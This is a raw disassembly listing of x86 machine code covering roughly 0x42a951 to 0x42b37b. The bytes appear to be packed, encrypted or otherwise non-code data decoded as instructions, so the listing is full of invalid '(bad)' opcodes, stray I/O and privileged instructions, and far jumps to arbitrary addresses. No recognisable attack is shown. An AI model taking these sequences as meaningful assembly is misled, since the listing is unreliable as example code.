  42a951:	not    DWORD PTR [edx+0x5a]
  42a954:	pop    es
  42a955:	jnp    0x42a8f4
  42a957:	lods   al,BYTE PTR ds:[esi]
  42a958:	sti    
  42a959:	or     esp,0x47429c8
  42a95f:	xor    ebx,edi
  42a961:	jp     0x42a982
  42a963:	call   0xdc9f814f
  42a968:	pushf  
  42a969:	ja     0x42a8f0
  42a96b:	inc    ecx
  42a96c:	xlat   BYTE PTR ds:[ebx]
  42a96d:	xchg   esi,eax
  42a96e:	pop    ebp
  42a96f:	aas    
  42a970:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a971:	jp     0x42a928
  42a973:	mov    cl,BYTE PTR [ecx-0x1d64c075]
  42a979:	out    dx,eax
  42a97a:	ret    
  42a97b:	loop   0x42a938
  42a97d:	add    BYTE PTR [ebp+0x4ff6efd1],0xcb
  42a984:	inc    edx
  42a985:	and    eax,0x953f052f
  42a98a:	dec    edi
  42a98b:	cwde   
  42a98c:	out    dx,eax
  42a98d:	or     dl,BYTE PTR [eax+0x25]
	...
  42a9f3:	add    BYTE PTR [eax+0x3fee1d93],ch
  42a9f9:	out    dx,al
  42a9fa:	sti    
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	shr    BYTE PTR [eax+0x2e],1
  42aa03:	call   0x104:0x1c7a4
  42aa0a:	add    BYTE PTR [eax],al
  42aa0c:	data16 mov WORD PTR [edx-0x66],ss
  42aa10:	pop    eax
  42aa11:	in     al,dx
  42aa12:	leave  
  42aa13:	es mov ecx,0x5cf21e5a
  42aa19:	xchg   ebx,eax
  42aa1a:	retf   
  42aa1b:	js     0x42aa06
  42aa1d:	and    bh,BYTE PTR [edx+ebp*4]
  42aa20:	lahf   
  42aa21:	dec    edx
  42aa22:	add    BYTE PTR [ecx+0x518a3986],ah
  42aa28:	pushf  
  42aa29:	xchg   esp,eax
  42aa2a:	in     eax,dx
  42aa2b:	add    DWORD PTR [edi],esi
  42aa2d:	mov    eax,0x7c8f6f30
  42aa32:	clc    
  42aa33:	mov    esi,0xe2b47847
  42aa38:	xchg   edi,eax
  42aa39:	add    eax,0x6e565adb
  42aa3e:	mov    al,0x86
  42aa40:	rol    BYTE PTR [ecx],cl
  42aa42:	icebp  
  42aa43:	jecxz  0x42aa9a
  42aa45:	in     eax,dx
  42aa46:	fst    QWORD PTR [edx]
  42aa48:	fadd   st,st(5)
  42aa4a:	aas    
  42aa4b:	mov    dl,0x28
  42aa4d:	daa    
  42aa4e:	sub    al,0xd0
  42aa50:	cdq    
  42aa51:	cs sti 
  42aa53:	xchg   edx,eax
  42aa54:	mov    edx,0x66cc7c27
  42aa59:	mov    BYTE PTR [edx+0x1d083e0],bh
  42aa5f:	lahf   
  42aa60:	add    BYTE PTR [ebx],dh
  42aa62:	mov    esp,0x46003831
  42aa67:	sbb    al,0xac
  42aa69:	push   ecx
  42aa6a:	and    eax,0xc9277fcf
  42aa6f:	push   ecx
  42aa70:	push   ds
  42aa71:	cmp    eax,0x23fa853c
  42aa76:	adc    al,0x9b
  42aa78:	inc    ecx
  42aa79:	ds je  0x42aab6
  42aa7c:	sub    BYTE PTR [eax],bl
  42aa7e:	mov    ds:0xad83a3a,al
  42aa83:	add    ebx,ebp
  42aa85:	repnz mov ecx,0xeb8b6c46
  42aa8b:	mov    al,0x6
  42aa8d:	lods   eax,DWORD PTR ds:[esi]
  42aa8e:	sbb    bl,BYTE PTR [ebp-0x490bfdac]
  42aa94:	and    DWORD PTR [ecx],ebp
  42aa96:	fcmovb st,st(0)
  42aa98:	and    dh,bl
  42aa9a:	int    0x5f
  42aa9c:	sub    ebp,DWORD PTR [ecx-0x7f4c5533]
  42aaa2:	push   esp
  42aaa3:	mov    cl,0xac
  42aaa5:	dec    esi
  42aaa6:	outs   dx,DWORD PTR ds:[esi]
  42aaa7:	mov    WORD PTR gs:[ecx-0x2b],?
  42aaab:	(bad)  
  42aaac:	mov    ebp,0xdc9b4777
  42aab1:	or     ebp,DWORD PTR [esi+0x2ea3d7d1]
  42aab7:	pop    ds
  42aab8:	xchg   ebp,eax
  42aab9:	cmc    
  42aaba:	adc    eax,0xe1ddc508
  42aabf:	sub    ebp,eax
  42aac1:	dec    edx
  42aac2:	retf   
  42aac3:	test   eax,0xf4a53b1e
  42aac8:	test   DWORD PTR [edi+0x7d67db9d],ebp
  42aace:	cld    
  42aacf:	or     DWORD PTR ds:0x5da95307,0xffffffa1
  42aad6:	(bad)  
  42aad7:	psllq  mm0,QWORD PTR [eax-0x2a5469cb]
  42aade:	sbb    ebp,DWORD PTR [ebx-0x67aaccca]
  42aae4:	sar    BYTE PTR [ebp+0x3f2b83cb],cl
  42aaea:	inc    ebp
  42aaeb:	mov    bh,BYTE PTR [ecx-0x699349b2]
  42aaf1:	pop    esi
  42aaf2:	sbb    esi,DWORD PTR [ecx-0xe]
  42aaf5:	pop    eax
  42aaf6:	jg     0x42ab52
  42aaf8:	xsaves [esi+0x733cc83]
  42aaff:	add    BYTE PTR [esi+0x2bfccb84],cl
  42ab05:	mov    esi,0x8a59f0ba
  42ab0a:	inc    edx
  42ab0b:	mov    ds:0x4bbb9f2d,al
	...
  42ab74:	ds push cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	iret   
  42ab81:	sub    bl,BYTE PTR [ebp+0x46]
  42ab84:	test   al,0xc8
  42ab86:	add    DWORD PTR [eax],eax
  42ab88:	add    al,0x1
  42ab8a:	add    BYTE PTR [eax],al
  42ab8c:	push   esp
  42ab8d:	jbe    0x42ab2d
  42ab8f:	inc    edi
  42ab90:	jecxz  0x42ac0b
  42ab92:	adc    dl,al
  42ab94:	sar    BYTE PTR [eax+0x59c1440d],cl
  42ab9a:	pop    ss
  42ab9b:	push   ds
  42ab9c:	and    DWORD PTR [eax+0x7cccc7f2],esi
  42aba2:	inc    ebp
  42aba3:	imul   esi
  42aba5:	add    BYTE PTR [ecx],al
  42aba7:	(bad)  
  42aba8:	out    0xb8,eax
  42abaa:	pusha  
  42abab:	xor    DWORD PTR [eax-0x530c975e],0xb205634a
  42abb5:	dec    edx
  42abb6:	xor    eax,0x189d0f89
  42abbb:	and    al,BYTE PTR [esp+eiz*4]
  42abbe:	jle    0x42ac14
  42abc0:	arpl   cx,si
  42abc2:	imul   DWORD PTR [esi]
  42abc4:	jne    0x42ac19
  42abc6:	cld    
  42abc7:	and    ch,BYTE PTR [ebx-0x5b]
  42abca:	ret    
  42abcb:	out    0x17,al
  42abcd:	mov    al,0x13
  42abcf:	add    ah,bh
  42abd1:	mov    al,0x86
  42abd3:	int3   
  42abd4:	push   esp
  42abd5:	inc    ecx
  42abd6:	xchg   edi,eax
  42abd7:	(bad)
  42abda:	mov    ebp,DWORD PTR [ecx+0x1193932a]
  42abe0:	mov    gs,WORD PTR [esi+0x4]
  42abe3:	mov    edx,0x83dde301
  42abe8:	icebp  
  42abe9:	cmp    al,0x3c
  42abeb:	or     al,0xaa
  42abed:	add    bh,BYTE PTR [esp+eax*1]
  42abf0:	dec    ecx
  42abf1:	xor    eax,0x1e6784f6
  42abf6:	inc    ebx
  42abf7:	sub    al,0x46
  42abf9:	in     eax,0x58
  42abfb:	std    
  42abfc:	add    eax,0x4b6c65d5
  42ac01:	fsubr  QWORD PTR [esi-0x4d8c2a11]
  42ac07:	in     al,0xa6
  42ac09:	sahf   
  42ac0a:	jb     0x42ac74
  42ac0c:	mov    dh,BYTE PTR [edx+0x7a5ce975]
  42ac12:	je     0x42abe3
  42ac14:	(bad)  
  42ac15:	mov    DWORD PTR [edx+0x4a],0xae7b6916
  42ac1c:	je     0x42ac1a
  42ac1e:	cld    
  42ac1f:	dec    ecx
  42ac20:	dec    ecx
  42ac21:	neg    edx
  42ac23:	int    0x63
  42ac25:	mov    ds:0xadd46ec6,eax
  42ac2a:	mov    ds:0x99e64c81,al
  42ac2f:	sbb    ebp,DWORD PTR [eax]
  42ac31:	add    DWORD PTR [edx-0x58a9dba8],ebx
  42ac37:	pop    eax
  42ac38:	cmp    dl,dl
  42ac3a:	mov    dh,0x5e
  42ac3c:	mov    esp,DWORD PTR [ebx-0x486305ad]
  42ac42:	xchg   BYTE PTR [edi+ebp*2+0x621a586a],al
  42ac49:	jns    0x42acc7
  42ac4b:	retf   0xcb57
  42ac4e:	lea    eax,[edi+0x11342b42]
  42ac54:	cmp    BYTE PTR [edi+0x21],al
  42ac57:	cwde   
  42ac58:	arpl   WORD PTR [ebx],cx
  42ac5a:	pushf  
  42ac5b:	dec    esi
  42ac5c:	stc    
  42ac5d:	mov    ecx,0x4fb548e7
  42ac62:	and    DWORD PTR [ebx+eiz*1+0x52],esi
  42ac66:	out    dx,eax
  42ac67:	push   0x3978edaf
  42ac6c:	jnp    0x42ac79
  42ac6e:	rcr    BYTE PTR [ebx+0x48],cl
  42ac71:	ja     0x42ac6c
  42ac73:	aas    
  42ac74:	adc    al,0x55
  42ac76:	cmp    DWORD PTR [eax+edi*2],ecx
  42ac79:	mov    dl,0x45
  42ac7b:	mov    bh,0xe8
  42ac7d:	push   0x6
  42ac7f:	inc    esp
  42ac80:	inc    DWORD PTR [ecx+eax*1+0x5a]
  42ac84:	rcr    BYTE PTR [ebp-0x46],0x36
  42ac88:	aas    
  42ac89:	sub    al,0xc2
  42ac8b:	inc    edx
  42ac8c:	(bad)  [esp+esi*8+0x69]
	...
  42acf3:	add    cl,ch
  42acf5:	xor    bl,BYTE PTR [edx+edi*1]
  42acf8:	fistp  QWORD PTR [esi]
  42acfa:	out    dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	fsub   DWORD PTR [edi-0x3653aeef]
  42ad06:	add    DWORD PTR [eax],eax
  42ad08:	add    al,0x1
  42ad0a:	add    BYTE PTR [eax],al
  42ad0c:	imul   ecx,DWORD PTR ds:0x56472fe0,0x6d
  42ad13:	inc    ebx
  42ad14:	aam    0x63
  42ad16:	add    dl,bh
  42ad18:	sbb    al,0x65
  42ad1a:	dec    edx
  42ad1b:	aaa    
  42ad1c:	or     dh,ah
  42ad1e:	xor    DWORD PTR [edx],esi
  42ad20:	cwde   
  42ad21:	and    eax,0x431746d8
  42ad26:	(bad)  
  42ad27:	push   ds
  42ad28:	jl     0x42ad97
  42ad2a:	and    eax,0xc4cde6dd
  42ad2f:	mov    edx,0x7661a9d5
  42ad34:	xchg   edi,eax
  42ad35:	fwait
  42ad36:	jns    0x42acdf
  42ad38:	cdq    
  42ad39:	dec    edi
  42ad3a:	ror    DWORD PTR [edi+0x58358534],1
  42ad40:	(bad)  
  42ad41:	loop   0x42adb1
  42ad43:	addr16 popf 
  42ad45:	sub    ch,ah
  42ad47:	ret    0xb551
  42ad4a:	inc    esp
  42ad4b:	xor    al,0xcf
  42ad4d:	cmp    BYTE PTR [ebx],0x84
  42ad50:	push   ss
  42ad51:	dec    ecx
  42ad52:	cs nop
  42ad54:	xchg   ecx,eax
  42ad55:	repz mov esi,0x170ec6d6
  42ad5b:	test   BYTE PTR [edi+0x2b],bh
  42ad5e:	ffreep st(0)
  42ad60:	or     edx,eax
  42ad62:	push   esi
  42ad63:	shr    al,0x5d
  42ad66:	loop   0x42ad4d
  42ad68:	dec    ebp
  42ad69:	sti    
  42ad6a:	js     0x42ad66
  42ad6c:	repz popa 
  42ad6e:	lock out dx,al
  42ad70:	inc    esp
  42ad71:	xchg   ebp,eax
  42ad72:	sti    
  42ad73:	aam    0xc5
  42ad75:	push   edx
  42ad76:	xchg   esp,eax
  42ad77:	lods   eax,DWORD PTR ds:[esi]
  42ad78:	jbe    0x42ad51
  42ad7a:	dec    esi
  42ad7b:	cld    
  42ad7c:	loop   0x42adef
  42ad7e:	retf   0xc88f
  42ad81:	cmp    ch,BYTE PTR [eax]
  42ad83:	les    eax,FWORD PTR [esi-0x456b1f98]
  42ad89:	sar    al,1
  42ad8b:	(bad)  
  42ad8c:	xlat   BYTE PTR ds:[ebx]
  42ad8d:	je     0x42ad59
  42ad8f:	out    dx,al
  42ad90:	jp     0x42adab
  42ad92:	pop    eax
  42ad93:	mov    al,BYTE PTR [ecx-0x2dbe39a9]
  42ad99:	sub    ch,BYTE PTR [edx-0x63109a91]
  42ad9f:	jle    0x42ad66
  42ada1:	fimul  WORD PTR [ecx+ecx*4+0x29bf31f3]
  42ada8:	(bad)
  42adab:	lods   eax,DWORD PTR ds:[esi]
  42adac:	and    al,0xbb
  42adae:	lock push 0xddab51b
  42adb4:	sub    BYTE PTR [ecx+0x1c],bh
  42adb7:	cwde   
  42adb8:	inc    edx
  42adb9:	mov    esp,fs
  42adbb:	and    eax,0xc2c30e53
  42adc1:	sbb    DWORD PTR [esi-0x2404528e],edi
  42adc7:	xor    DWORD PTR [ebx+0x5cdeabb6],ecx
  42adcd:	sub    al,0xe9
  42adcf:	inc    eax
  42add0:	jno    0x42adac
  42add2:	aaa    
  42add3:	xchg   ecx,eax
  42add4:	retf   0x53ec
  42add7:	adc    eax,0x8d1de7d1
  42addc:	add    eax,0xcacbf956
  42ade1:	and    DWORD PTR [eax],eax
  42ade3:	pop    ss
  42ade4:	mov    edi,0xa403561
  42ade9:	pop    ebx
  42adea:	scas   al,BYTE PTR es:[edi]
  42adeb:	sub    eax,0x6ea0b64b
  42adf0:	lods   eax,DWORD PTR ds:[esi]
  42adf1:	pop    edi
  42adf2:	pop    ebx
  42adf3:	xor    bl,BYTE PTR [ebx-0x4a59ab4b]
  42adf9:	sub    edx,DWORD PTR [ebp-0x15]
  42adfc:	stos   DWORD PTR es:[edi],eax
  42adfd:	mov    bl,0x3b
  42adff:	pop    edi
  42ae00:	inc    edi
  42ae01:	nop
  42ae02:	popa   
  42ae03:	add    BYTE PTR [ebx],dl
  42ae05:	push   ecx
  42ae06:	sub    ebp,DWORD PTR [ecx+0x7d]
  42ae09:	sahf   
  42ae0a:	adc    esp,edx
  42ae0c:	les    esi,FWORD PTR [ebx+0x7]
  42ae0f:	mov    WORD PTR [eax],es
	...
  42ae71:	add    BYTE PTR [eax],al
  42ae73:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	fimul  WORD PTR [edx]
  42ae82:	and    eax,0x1cab09a
  42ae87:	add    BYTE PTR [ecx+eax*1],al
  42ae8a:	add    BYTE PTR [eax],al
  42ae8c:	xchg   edi,eax
  42ae8d:	gs pop ebp
  42ae8f:	into   
  42ae90:	pop    ebp
  42ae91:	dec    edi
  42ae92:	dec    eax
  42ae93:	loopne 0x42aee1
  42ae95:	push   esi
  42ae96:	or     al,0x38
  42ae98:	push   0xd
  42ae9a:	adc    BYTE PTR [esi+edi*1+0x77],ch
  42ae9e:	mov    ds,WORD PTR [ebx-0x5c53c541]
  42aea4:	or     al,0x67
  42aea6:	push   esi
  42aea7:	push   0xffffffe1
  42aea9:	inc    esp
  42aeaa:	pop    ecx
  42aeab:	add    eax,0xb835df77
  42aeb0:	pop    es
  42aeb1:	arpl   WORD PTR [ecx+0x39900c1a],si
  42aeb7:	test   eax,0x68c52221
  42aebc:	cmp    BYTE PTR [edi-0x6a],dh
  42aebf:	jg     0x42af09
  42aec1:	popa   
  42aec2:	lods   eax,DWORD PTR ds:[esi]
  42aec3:	adc    eax,0x8bc2b383
  42aec8:	push   ebp
  42aec9:	jge    0x42ae80
  42aecb:	add    eax,0x8fa35b17
  42aed0:	xor    ebx,DWORD PTR [edi-0x54]
  42aed3:	push   eax
  42aed4:	in     al,dx
  42aed5:	push   ss
  42aed6:	mov    bh,0x3b
  42aed8:	adc    ecx,DWORD PTR [ecx]
  42aeda:	inc    edx
  42aedb:	dec    ecx
  42aedc:	(bad)  
  42aedd:	les    esi,FWORD PTR [edx]
  42aedf:	push   eax
  42aee0:	fild   DWORD PTR [eax]
  42aee2:	dec    edx
  42aee3:	or     BYTE PTR [ecx-0x68],0x8e
  42aee7:	xor    eax,0xb6c2d134
  42aeec:	ret    
  42aeed:	jnp    0x42af09
  42aeef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aef0:	dec    ebx
  42aef1:	jbe    0x42af5c
  42aef3:	pusha  
  42aef4:	stc    
  42aef5:	add    al,0x39
  42aef7:	jmp    0x42aed8
  42aef9:	push   eax
  42aefa:	pop    ds
  42aefb:	sbb    esp,esi
  42aefd:	xor    ecx,esi
  42aeff:	adc    cl,BYTE PTR [eax+eiz*2-0x4b4a8ac3]
  42af06:	mov    dl,0x7f
  42af08:	sbb    DWORD PTR [eax+eiz*8+0x708c5d0d],esi
  42af0f:	sub    al,0xde
  42af11:	das    
  42af12:	and    BYTE PTR [ebp*2+0x73de312c],dh
  42af19:	sti    
  42af1a:	out    0x4c,eax
  42af1c:	push   ecx
  42af1d:	cmp    al,bl
  42af1f:	(bad)  
  42af20:	mov    al,0x9
  42af22:	fimul  WORD PTR [ebp+0x1b]
  42af25:	shr    BYTE PTR [eax-0x56035c7c],0xd9
  42af2c:	sbb    BYTE PTR [ebx+0x7778b4a1],bh
  42af32:	pop    ds
  42af33:	faddp  st(5),st
  42af35:	xor    eax,DWORD PTR [edi+0x677c6c]
  42af3b:	pop    ecx
  42af3c:	pop    edi
  42af3d:	out    dx,al
  42af3e:	cli    
  42af3f:	add    BYTE PTR [ecx],dl
  42af41:	and    DWORD PTR [edx-0x2d],edi
  42af44:	ficomp WORD PTR [esi]
  42af46:	sub    bl,BYTE PTR [edi+ebp*1-0x675bbcd9]
  42af4d:	inc    edi
  42af4e:	retf   0x2d47
  42af51:	dec    esp
  42af52:	out    dx,al
  42af53:	daa    
  42af54:	xor    eax,0xea6acb2a
  42af59:	dec    ebx
  42af5a:	inc    edx
  42af5b:	xor    eax,0xa9e6131e
  42af60:	clc    
  42af61:	mov    ds:0xcbbaaddb,eax
  42af66:	push   ebx
  42af67:	stos   BYTE PTR es:[edi],al
  42af68:	push   cs
  42af69:	(bad)  
  42af6a:	push   cs
  42af6b:	ret    0x8751
  42af6e:	mov    bh,0x55
  42af70:	mov    edi,0xce329621
  42af75:	jmp    0x3e73:0x793111fe
  42af7c:	pop    edi
  42af7d:	dec    ebp
  42af7e:	mov    ?,WORD PTR [esi+ebp*4]
  42af81:	push   esi
  42af82:	or     eax,0x45f73e10
  42af87:	adc    BYTE PTR [ecx-0x22],bl
  42af8a:	(bad)  
  42af8b:	retf   
  42af8c:	and    DWORD PTR [eax],0xb844
	...
  42aff2:	add    BYTE PTR [eax],al
  42aff4:	stc    
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	and    ebp,edx
  42b002:	scas   eax,DWORD PTR es:[edi]
  42b003:	sbb    esi,DWORD PTR [ebx+ecx*8+0x1040001]
  42b00a:	add    BYTE PTR [eax],al
  42b00c:	(bad)  
  42b00d:	call   0x847e:0x7b192dc
  42b014:	sub    al,BYTE PTR [edx+0x6fd3d148]
  42b01a:	ja     0x42b059
  42b01c:	iret   
  42b01d:	out    0xe0,al
  42b01f:	xchg   esp,eax
  42b020:	ret    
  42b021:	push   cs
  42b022:	iret   
  42b023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b024:	xlat   BYTE PTR ds:[ebx]
  42b025:	fdivrp st(3),st
  42b027:	lods   al,BYTE PTR ds:[esi]
  42b028:	or     DWORD PTR [ebp-0x2f],esp
  42b02b:	add    eax,0xd1cf8a46
  42b030:	outs   dx,BYTE PTR ds:[esi]
  42b031:	pop    edx
  42b032:	fiadd  WORD PTR [ebx]
  42b034:	xor    eax,0xc61885e1
  42b039:	or     BYTE PTR [ebp-0x11532bce],ch
  42b03f:	(bad)  
  42b040:	sub    eax,DWORD PTR [edx-0x80]
  42b043:	sbb    dh,0x9b
  42b046:	bound  ebx,QWORD PTR [esi-0x4ac789f2]
  42b04c:	enter  0xb858,0x48
  42b050:	pop    eax
  42b051:	ss xchg ecx,eax
  42b053:	jb     0x42b0c4
  42b055:	out    dx,eax
  42b056:	iret   
  42b057:	pop    ebx
  42b058:	and    ch,BYTE PTR [edx]
  42b05a:	xchg   edi,eax
  42b05b:	inc    BYTE PTR [ebx]
  42b05d:	jmp    0x8f2d0daf
  42b062:	(bad)  
  42b063:	adc    al,0x7
  42b065:	and    al,0x88
  42b067:	imul   eax,DWORD PTR [ecx-0x3c],0xbb1d4142
  42b06e:	xor    BYTE PTR [esi+0x31],ah
  42b071:	call   0x9f5aee5b
  42b076:	add    edi,esi
  42b078:	add    DWORD PTR [ecx+0x19d5071d],edi
  42b07e:	and    BYTE PTR gs:[edx+eiz*2-0x54aeb5c2],ch
  42b086:	jno    0x42b090
  42b088:	(bad)  
  42b089:	dec    ebx
  42b08a:	sbb    al,0xe5
  42b08c:	inc    eax
  42b08d:	dec    ebx
  42b08e:	std    
  42b08f:	push   0xffffff9d
  42b091:	out    dx,eax
  42b092:	push   0xffffffd9
  42b094:	bound  esi,QWORD PTR ds:0xe95e1cbe
  42b09a:	dec    esp
  42b09b:	xor    dh,BYTE PTR [edx]
  42b09d:	les    ecx,FWORD PTR [ebp-0x7a]
  42b0a0:	xor    al,0x2d
  42b0a2:	imul   esp,DWORD PTR [edi],0xffffffd3
  42b0a5:	mov    al,0xa8
  42b0a7:	lea    eax,[edx+0x7f]
  42b0aa:	jle    0x42b074
  42b0ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b0ad:	or     BYTE PTR [ebx-0x2c04f561],ch
  42b0b3:	mov    edx,0x293f9278
  42b0b8:	dec    ebx
  42b0b9:	xchg   edx,eax
  42b0ba:	xor    eax,0x9847b86f
  42b0bf:	sub    al,0x97
  42b0c1:	repz fcom st(5)
  42b0c4:	mov    bh,0xba
  42b0c6:	adc    DWORD PTR [edx],edx
  42b0c8:	pop    esi
  42b0c9:	test   BYTE PTR [ebx+0x5b7ceb53],dh
  42b0cf:	ja     0x42b0a3
  42b0d1:	adc    al,0xa
  42b0d3:	(bad)  
  42b0d4:	dec    eax
  42b0d5:	leave  
  42b0d6:	dec    eax
  42b0d7:	outs   dx,BYTE PTR ds:[esi]
  42b0d8:	jge    0x42b0aa
  42b0da:	cmp    eax,0x8de3949
  42b0df:	loope  0x42b06f
  42b0e1:	int3   
  42b0e2:	sti    
  42b0e3:	lock jl 0x42b0ef
  42b0e6:	xor    eax,0xea20f5a5
  42b0eb:	cmp    ch,BYTE PTR [ecx+0x27]
  42b0ee:	mov    eax,ds:0x6853be2b
  42b0f3:	ins    BYTE PTR es:[edi],dx
  42b0f4:	in     ax,0x80
  42b0f7:	popf   
  42b0f8:	sbb    eax,0x247ae569
  42b0fd:	mov    al,ds:0x61e0657e
  42b102:	and    eax,0x8abe152b
  42b107:	mov    al,0xe7
  42b109:	sbb    al,0x50
  42b10b:	lea    esp,[ecx+0xe51f87]
	...
  42b171:	add    BYTE PTR [eax],al
  42b173:	add    BYTE PTR [ebp+0x25],dh
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	push   esp
  42b181:	mov    dl,0x2a
  42b183:	ins    DWORD PTR es:[edi],dx
  42b184:	mov    eax,0x40001cc
  42b189:	add    DWORD PTR [eax],eax
  42b18b:	add    al,cl
  42b18d:	ror    DWORD PTR gs:[esi],1
  42b190:	in     eax,dx
  42b191:	pop    ss
  42b192:	iret   
  42b193:	arpl   WORD PTR [ecx+0x29],bp
  42b196:	(bad)
  42b19b:	pop    edi
  42b19c:	sbb    BYTE PTR ds:0xf847e9f1,dh
  42b1a2:	adc    eax,0xf13f25f3
  42b1a7:	popa   
  42b1a8:	pusha  
  42b1a9:	push   ebx
  42b1aa:	aas    
  42b1ab:	and    BYTE PTR [ecx-0x589f4e3b],cl
  42b1b1:	xor    eax,0x455e17f3
  42b1b6:	sbb    bh,BYTE PTR [edi+0x60]
  42b1b9:	mov    ?,WORD PTR [ebp-0x6c]
  42b1bc:	dec    ebx
  42b1bd:	and    ebp,DWORD PTR [edx+edi*1-0x41]
  42b1c1:	mov    DWORD PTR [ebx+0x1f],edi
  42b1c4:	push   DWORD PTR [ecx+eax*8+0x29]
  42b1c8:	aam    0xde
  42b1ca:	fcom   DWORD PTR [esi+0x4ea2270d]
  42b1d0:	adc    al,0x40
  42b1d2:	or     eax,0x80250eaa
  42b1d7:	xchg   ebp,eax
  42b1d8:	ins    DWORD PTR es:[edi],dx
  42b1d9:	jns    0x42b249
  42b1db:	pop    DWORD PTR [ebp+0x1b]
  42b1de:	into   
  42b1df:	test   eax,0x91e59b22
  42b1e4:	dec    esp
  42b1e5:	and    eax,0xd3b2b6
  42b1ea:	(bad)  
  42b1eb:	xor    DWORD PTR [eax-0xdc665ea],ebx
  42b1f1:	jp     0x42b256
  42b1f3:	add    DWORD PTR [eax],esi
  42b1f5:	xchg   ebp,eax
  42b1f6:	cmp    BYTE PTR ds:0xf518653c,dh
  42b1fc:	mov    ah,0x88
  42b1fe:	gs cmc 
  42b200:	daa    
  42b201:	mov    DWORD PTR [eax],eax
  42b203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b204:	fcmovnu st,st(3)
  42b206:	leave  
  42b207:	js     0x42b1ed
  42b209:	mov    cl,0x2f
  42b20b:	shl    ebp,cl
  42b20d:	and    al,0x41
  42b20f:	sub    ch,0x24
  42b212:	mov    al,ds:0x270e70f
  42b217:	popf   
  42b218:	and    ah,bh
  42b21a:	and    DWORD PTR [edi-0xcc49f9],edx
  42b220:	call   0xa98a53ae
  42b225:	pop    es
  42b226:	sbb    BYTE PTR [ebp-0x208cccdd],ch
  42b22c:	(bad)  
  42b22d:	and    DWORD PTR [ecx+0x43],edx
  42b230:	cmc    
  42b231:	push   esi
  42b232:	adc    DWORD PTR [ebp-0x467ff8a9],edx
  42b238:	inc    esi
  42b239:	mov    bh,0xff
  42b23b:	out    0x23,al
  42b23d:	dec    ebx
  42b23e:	pushf  
  42b23f:	add    BYTE PTR [ebx],dl
  42b241:	and    DWORD PTR [ecx+0x3],edx
  42b244:	push   eax
  42b245:	add    dl,BYTE PTR [ecx+0x12]
  42b248:	iret   
  42b249:	aam    0xdf
  42b24b:	mov    ds:0x2e0cb1ef,eax
  42b250:	les    eax,FWORD PTR [ecx-0x27]
  42b253:	or     al,0xd7
  42b255:	ins    BYTE PTR es:[edi],dx
  42b256:	popf   
  42b257:	pop    esp
  42b258:	ins    BYTE PTR es:[edi],dx
  42b259:	bound  esi,QWORD PTR [ebp+edi*1+0x77fde55d]
  42b260:	fstp   TBYTE PTR [edx+eiz*8]
  42b263:	js     0x42b24c
  42b265:	std    
  42b266:	nop
  42b267:	in     al,0x91
  42b269:	mov    ebx,0x13c4d68
  42b26e:	jecxz  0x42b218
  42b270:	push   0xffffff9c
  42b272:	mov    ebx,esi
  42b274:	ret    0x2e9b
  42b277:	mov    edi,0x1ea34afd
  42b27c:	hlt    
  42b27d:	adc    ebp,DWORD PTR [edx-0x6221d021]
  42b283:	mov    dl,0x96
  42b285:	dec    edi
  42b286:	ins    BYTE PTR es:[edi],dx
  42b287:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b288:	mov    bl,BYTE PTR [ebx+edi*8]
  42b28b:	mov    BYTE PTR [ebx+0x21],0xad
  42b28f:	push   0x0
	...
  42b2f1:	add    BYTE PTR [eax],al
  42b2f3:	add    BYTE PTR [ebp-0x449f6672],ah
  42b2f9:	ja     0x42b2f8
  42b2fb:	iret   
  42b2fc:	sub    eax,0xc7738e65
  42b301:	stos   BYTE PTR es:[edi],al
  42b302:	add    cl,BYTE PTR [ecx]
  42b304:	mov    esp,0x40001cd
  42b309:	add    DWORD PTR [eax],eax
  42b30b:	add    BYTE PTR [edx-0x57],bl
  42b30e:	scas   al,BYTE PTR es:[edi]
  42b30f:	xchg   ecx,eax
  42b310:	ret    0xa3ba
  42b313:	lods   al,BYTE PTR ds:[esi]
  42b314:	repnz dec edx
  42b316:	inc    eax
  42b317:	xchg   ebp,eax
  42b318:	or     bl,dl
  42b31a:	stos   BYTE PTR es:[edi],al
  42b31b:	das    
  42b31c:	xor    cl,BYTE PTR [ecx+eax*8-0x5f42bfb8]
  42b323:	mov    ecx,0x40b93e7f
  42b328:	out    0x3b,eax
  42b32a:	nop
  42b32b:	xchg   ebx,eax
  42b32c:	lea    edi,[ebx-0x3ab3c835]
  42b332:	dec    eax
  42b333:	mov    dl,0x6
  42b335:	shl    BYTE PTR [ebp-0x11],0x2a
  42b339:	push   0x79
  42b33b:	les    ebp,FWORD PTR [ecx-0x6e7f37ae]
  42b341:	mov    WORD PTR [eax+0xd7dc859],ds
  42b347:	adc    BYTE PTR [ecx+0x6a2fd840],bl
  42b34d:	es mov ebp,0x74b07cb2
  42b353:	add    eax,0x7f67a469
  42b358:	mov    edx,0x6313f775
  42b35d:	xchg   BYTE PTR [edi],bh
  42b35f:	push   0x9c52e394
  42b364:	adc    eax,0xf9b72d25
  42b369:	push   cs
  42b36a:	stc    
  42b36b:	or     ebp,DWORD PTR [eax]
  42b36d:	push   ecx
  42b36e:	pop    es
  42b36f:	jns    0x42b3b6
  42b371:	jnp    0x42b306
  42b373:	mov    bl,0x93
  42b375:	inc    ebp
  42b376:	pop    ss
  42b377:	in     al,dx
  42b378:	fcom   QWORD PTR [ecx]
  42b37a:	pop    edi
  42b37b:	retf   
